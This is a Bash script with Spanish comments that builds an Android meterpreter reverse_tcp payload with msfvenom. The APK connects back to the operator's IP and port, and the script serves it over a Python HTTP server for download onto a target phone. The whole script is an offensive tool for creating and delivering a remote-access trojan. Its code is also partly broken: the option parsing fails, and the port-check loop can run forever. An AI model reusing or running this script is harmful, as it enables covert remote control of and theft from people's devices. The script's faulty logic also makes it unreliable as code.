#!/bin/bash

# Definir colores
GREEN="\e[32m"
RED="\e[31m"
RESET="\e[0m"

# Función para mostrar el uso del script
usage() {
    echo "Uso: $0 [-ip <IP_ADDRESS>] [-port <PORT>]"
    exit 1
}

# Función para mostrar mensajes en verde
print_green() {
    echo -e "${GREEN}$1${RESET}"
}

# Función para mostrar mensajes en rojo
print_red() {
    echo -e "${RED}$1${RESET}"
}

# Inicializar las variables
LOCAL_IP=""
PORT=""

# Procesar las opciones de línea de comandos
while getopts ":ip:port:" opt; do
    case ${opt} in
        ip )
            LOCAL_IP=$OPTARG
            ;;
        port )
            PORT=$OPTARG
            ;;
        \? )
            usage
            ;;
    esac
done

# Si no se proporcionó una IP, intentar obtener la IP local
if [[ -z "$LOCAL_IP" ]]; then
    LOCAL_IP=$(hostname -I | awk '{print $1}')
fi

# Si no se proporcionó un puerto, usar un valor predeterminado
if [[ -z "$PORT" ]]; then
    PORT=4444
fi

# Si no tenemos instalado msfvenom lo instalamos
if ! command -v msfvenom &> /dev/null; then
    print_red "msfvenom no está instalado. Instalándolo..."
    sudo apt-get install -y metasploit-framework
    if [ $? -ne 0 ]; then
        print_red "Error al instalar msfvenom."
        exit 1
    fi
fi

# Eliminar si ya dispongo de un archivo main.apk
if [ -f main.apk ]; then
    rm main.apk
    print_red "Archivo main.apk eliminado."
fi

# Generar el payload de Android con msfvenom
msfvenom -p android/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=$PORT -o main.apk
if [ $? -eq 0 ]; then
    print_green "Payload generado exitosamente: main.apk"
else
    print_red "Error al generar el payload."
    exit 1
fi

# Verificar si tenemos instalado Python 3
if ! command -v python3 &> /dev/null; then
    print_red "Python 3 no está instalado. Instalándolo..."
    sudo apt-get install -y python3
    if [ $? -ne 0 ]; then
        print_red "Error al instalar Python 3."
        exit 1
    fi
fi

# Nos aseguramos que el puerto 8000 no esté en uso, si lo esta utilizamos otro
while nc -z localhost 8000; do
    print_red "El puerto 8000 está en uso. Utilizando otro puerto..."
    PORT=$((PORT + 1))
done

# Creamos un servidor HTTP para descargar el APK con Python 3
python3 -m http.server $PORT &>/dev/null &

# Verificar si se inició el servidor HTTP
if [ $? -eq 0 ]; then
    print_green "Servidor HTTP iniciado en el puerto $PORT."
else
    print_red "Error al iniciar el servidor HTTP."
    exit 1
fi

# Verificar si el archivo main.apk se generó correctamente
if [ -f main.apk ]; then
    print_green "Archivo main.apk disponible en http://$LOCAL_IP:$PORT/main.apk"
else
    print_red "Error: main.apk no se generó correctamente."
    exit 1
fi